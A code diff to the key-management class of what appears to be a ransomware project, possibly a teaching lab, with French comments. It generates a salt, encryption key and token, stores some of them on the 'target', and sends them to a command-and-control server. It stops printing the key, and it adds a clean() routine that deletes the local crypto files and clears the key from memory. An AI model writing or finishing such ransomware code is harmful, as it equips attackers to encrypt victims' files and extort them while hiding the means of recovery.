@@ -64,29 +64,26 @@ class SecretManager:
 
     def setup(self) -> None:
         # Vérification de l'existence d'un fichier self._token.bin
-        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
-            raise FileExistsError("Un fichier token.bin existe déjà. Annulation du setup.")
+        if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
+            raise FileExistsError("Un fichier _token.bin existe déjà. Annulation du setup.")
         
 
         # Création des éléments cryptographiques
         self._salt, self._key, self._token = self.create()
-        print(f"Clé de chiffrement: {self._key}")
-
         # Création du répertoire si nécessaire
         os.makedirs(self._path, exist_ok=True)
         # Sauvegarde du sel et du self._token en local
-        with open(os.path.join(self._path, "salt.bin"), "wb") as self._salt_file:
+        with open(os.path.join(self._path, "_salt.bin"), "wb") as self._salt_file:
             self._salt_file.write(self._salt)
-        with open(os.path.join(self._path, "token.bin"), "wb") as self._token_file:
+        with open(os.path.join(self._path, "_token.bin"), "wb") as self._token_file:
             self._token_file.write(self._token)
 
-        
         # Envoi des éléments cryptographiques au CNC
         self.post_new(self._salt, self._key, self._token)
 
     def load(self) -> None:
-        salt_path = os.path.join(self._path, "self._salt.bin")
-        token_path = os.path.join(self._path, "self._token.bin")
+        salt_path = os.path.join(self._path, "_salt.bin")
+        token_path = os.path.join(self._path, "_token.bin")
 
         if os.path.exists(salt_path) and os.path.exists(token_path):
             with open(salt_path, "rb") as salt_file:
@@ -94,7 +91,7 @@ class SecretManager:
             with open(token_path, "rb") as token_file:
                 self._token = token_file.read()
         else:
-            self._log.warning("Les fichiers self._salt.bin et/ou self._token.bin n'existent pas. Impossible de charger les données cryptographiques.")
+            self._log.warning("Les fichiers _salt.bin et/ou _token.bin n'existent pas. Impossible de charger les données cryptographiques.")
 
 
 
@@ -128,8 +125,30 @@ class SecretManager:
         # send file, geniune path and token to the CNC
         raise NotImplemented()
 
-    def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
-    
-    
+    def clean(self) -> None:
+        # Remove local cryptographic data (salt.bin and token.bin)
+        salt_path = os.path.join(self._path, "_salt.bin")
+        token_path = os.path.join(self._path, "_token.bin")
+
+        try:
+            if os.path.exists(salt_path):
+                os.remove(salt_path)
+                self._log.info("Removed _salt.bin file.")
+            else:
+                self._log.warning("_salt.bin file does not exist.")
+        except Exception as e:
+            self._log.error(f"Error while removing _salt.bin file: {e}")
+
+        try:
+            if os.path.exists(token_path):
+                os.remove(token_path)
+                self._log.info("Removed _token.bin file.")
+            else:
+                self._log.warning("_token.bin file does not exist.")
+        except Exception as e:
+            self._log.error(f"Error while removing _token.bin file: {e}")
+
+        # Clear in-memory data
+        self._salt = None
+        self._token = None
+        self._key = None
